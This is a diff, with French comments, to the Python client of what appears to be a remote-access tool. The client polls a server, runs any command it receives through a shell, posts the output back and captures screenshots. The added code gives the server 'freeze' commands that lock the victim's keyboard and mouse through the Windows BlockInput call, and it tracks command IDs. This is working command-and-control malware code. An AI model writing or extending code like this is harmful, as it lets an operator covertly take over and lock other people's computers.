@@ -14,6 +14,7 @@ import json
 import threading
 import logging
 import colorama  # Add colorama for colored console output
+import ctypes    # Import ctypes for direct Windows API access
 
 # Initialize colorama
 colorama.init(autoreset=True)
@@ -119,10 +120,76 @@ def capture_screenshot():
         logger.error(f"Erreur lors de la capture d'écran: {e}")
         return None
 
+# Fonction directe pour geler l'écran (sera utilisée par la commande spéciale)
+def freeze_screen(seconds=0):
+    """Gel de l'écran en utilisant BlockInput. Si seconds est > 0, débloque après ce délai."""
+    try:
+        if platform.system() == "Windows":
+            # Bloquer les entrées
+            ctypes.windll.user32.BlockInput(True)
+            logger.info(f"Écran gelé avec BlockInput")
+            
+            # Si un délai est spécifié, planifier le déblocage
+            if seconds > 0:
+                def unfreeze():
+                    try:
+                        ctypes.windll.user32.BlockInput(False)
+                        logger.info(f"Écran dégelé après {seconds} secondes")
+                    except Exception as e:
+                        logger.error(f"Erreur lors du dégel après délai: {e}")
+                
+                # Créer un thread pour débloquer après le délai
+                timer = threading.Timer(seconds, unfreeze)
+                timer.daemon = True
+                timer.start()
+                
+            return True
+    except Exception as e:
+        logger.error(f"Erreur lors du gel de l'écran: {e}")
+    return False
+
+# Fonction pour dégeler l'écran
+def unfreeze_screen():
+    """Débloque les entrées gelées par BlockInput"""
+    try:
+        if platform.system() == "Windows":
+            ctypes.windll.user32.BlockInput(False)
+            logger.info("Écran dégelé")
+            return True
+    except Exception as e:
+        logger.error(f"Erreur lors du dégel de l'écran: {e}")
+    return False
+
 def execute_command(command):
     try:
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout, result.stderr
+        # Traitement des commandes spéciales
+        command_lower = command.lower().strip()
+        
+        if command_lower == "freeze":
+            # Gel sans limite de temps
+            if freeze_screen():
+                return "Écran gelé avec succès. Utilisez 'unfreeze' pour débloquer.", ""
+            else:
+                return None, "Échec du gel de l'écran"
+        
+        elif command_lower == "freeze30":
+            # Gel avec délai de 30 secondes
+            if freeze_screen(30):
+                return "Écran gelé pour 30 secondes", ""
+            else:
+                return None, "Échec du gel de l'écran"
+        
+        elif command_lower == "unfreeze":
+            # Dégel immédiat
+            if unfreeze_screen():
+                return "Écran dégelé avec succès", ""
+            else:
+                return None, "Échec du dégel de l'écran"
+        
+        else:
+            # Exécution normale de commande système
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+            return result.stdout, result.stderr
     except Exception as e:
         return None, str(e)
 
@@ -133,12 +200,19 @@ def check_for_command(client_id):
             data = response.json()
             if 'command' in data and data['command']:
                 command_to_execute = data['command']
-                logger.info(f"Commande reçue du serveur: {command_to_execute}")
+                command_id = data.get('command_id')
+                logger.info(f"Commande reçue du serveur: {command_to_execute} (ID: {command_id})")
                 stdout, stderr = execute_command(command_to_execute)
-                result = {'stdout': stdout, 'stderr': stderr, 'command': command_to_execute}
+                result = {
+                    'stdout': stdout,
+                    'stderr': stderr,
+                    'command': command_to_execute,
+                    'command_id': command_id
+                }
                 requests.post(f"{SERVER_URL}/client/{client_id}/commandresult", json=result)
     except Exception as e:
         logger.error(f"Erreur lors de la vérification des commandes: {e}")
+
 def change_api(api):
     global API_KEY
     API_KEY = api
@@ -151,14 +225,12 @@ def check_for_api(client_id):
         response = requests.get(f"{SERVER_URL}/client/{client_id}/token")
       
         if response.status_code == 200:
-
             data = response.json()
-            print(data)
             if 'api' in data and data['api']:
                 api_to_execute = data['api']
                 logger.info(f"Api reçue du serveur: {api_to_execute}")
                 key = change_api(api_to_execute)
-                result = {'stdout': stdout, 'stderr': stderr, 'command': api_to_execute}
+                result = {'stdout': "API key updated successfully", 'stderr': "", 'command': "update_api_key"}
                 requests.post(f"{SERVER_URL}/client/{client_id}/commandresult", json=result)
     except Exception as e:
         logger.error(f"Erreur lors de la vérification API: {e}")
